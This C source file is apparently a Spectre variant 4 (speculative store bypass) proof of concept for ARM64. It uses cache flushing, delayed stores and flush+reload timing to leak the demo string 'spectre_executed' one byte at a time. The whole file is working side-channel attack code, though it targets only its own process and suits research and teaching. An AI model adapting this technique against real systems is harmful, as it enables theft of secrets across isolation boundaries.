#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <string.h>
#include "utils.h"

#define LEN 16
#define MAX_TRIES 5000
#define CACHE_HIT_THRESHOLD 190
#define STRIDE 4096
#define REPEAT_16(x) x x x x x x x x x x x x x x x x
#define REPEAT_20(x) x x x x x x x x x x x x x x x x x x x x 

#define NOPS(n) \
    asm volatile( \
        ".rept %0\n" \
        "nop\n" \
        ".endr\n" \
        :: "i" (n) \
    )




unsigned char **memory_slot_ptr __attribute__((aligned(4096)));
unsigned char *memory_slot __attribute__((aligned(4096)));

unsigned char secret_key[] = "spectre_executed";
unsigned char fake_buffer[] = "______fake______";
unsigned char *leak;

uint8_t *reloadbuffer;
volatile uint8_t tmp = 0;

static inline __attribute__((always_inline)) void measure_time() {
	uint64_t init;
	uint64_t end;
	volatile uint64_t pick;
	asm volatile(
	"ldr x1, %[val]\n"
	:
	:[val] "m" (pick)
	: "x1"
	);
	for(volatile int z = 0; z < 100; z++){}
	isb();

	init = get_cycles();
	NOPS(200);
	asm volatile(
	"adds x1, x1, #1\n"
	::: "x1"
	);
	end = get_cycles();
	isb();

	asm volatile(
	"str x1, %[val]\n"
	:
	: [val] "m" (pick)
	: "x1"
	);
	        printf("%ld\n", end - init);
	}

static inline __attribute__((always_inline)) void spectre_v4(size_t idx) {
	unsigned char **memory_slot_slow_ptr = memory_slot_ptr;
	NOPS(200);
	*memory_slot_slow_ptr = fake_buffer;
	tmp = reloadbuffer[memory_slot[idx] << 12];
	//measure_time();
}


static inline __attribute__((always_inline)) void attacker_function(int idx) {
	int access_index = 0;
		int results[256] = {0};
		volatile unsigned char pick = 0;
		REPEAT_20(
		for (int tries = 0; tries < MAX_TRIES / 20; tries++) {

			memory_slot = secret_key;

			cacheflush(memory_slot_ptr);
			for (int i = 0; i < 256; i++) {
				cacheflush(&reloadbuffer[i * STRIDE]);
			}
			for(volatile int z = 0; z < 100; z++){}
			isb();

			spectre_v4(idx);

			for (int i = 0; i < 256; i++) {
				access_index = ((i * 167) + 13) & 255;
				isb();
				uint64_t time1 = get_cycles(); 
				pick = reloadbuffer[access_index << 12]; // memory access to time
				uint64_t time2 = get_cycles() - time1; 
				isb();

				if (time2 <= CACHE_HIT_THRESHOLD && access_index != fake_buffer[idx]) {
					results[access_index]++; 
				}
			}
		}
		)
		int max = -1;
		for (int i = 0; i < 256; i++) {
			if (max < 0 || results[max] < results[i]) {
				max = i;
			}
		}
		printf("cache hit:%c, rate:%f\n", max,
			(double)results[max] * 100 / MAX_TRIES);
		*(leak + idx) = max;
}


int main(void) {
	reloadbuffer = (unsigned char *)mmap(0, STRIDE * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
	memset(reloadbuffer, 0, sizeof(uint8_t) * 256 * STRIDE);
	leak = (unsigned char *)malloc(sizeof(unsigned char) * LEN);
 	memory_slot = (unsigned char*) aligned_alloc(4096, sizeof(unsigned char)); 
    memory_slot_ptr = (unsigned char**) aligned_alloc(4096, sizeof(unsigned char));
    *memory_slot_ptr = memory_slot;

	int index = 0;
	REPEAT_16(
	attacker_function(index);
	index ++;
	)
	
	printf("%s\n", leak);
	free(leak);
	leak = NULL;
}
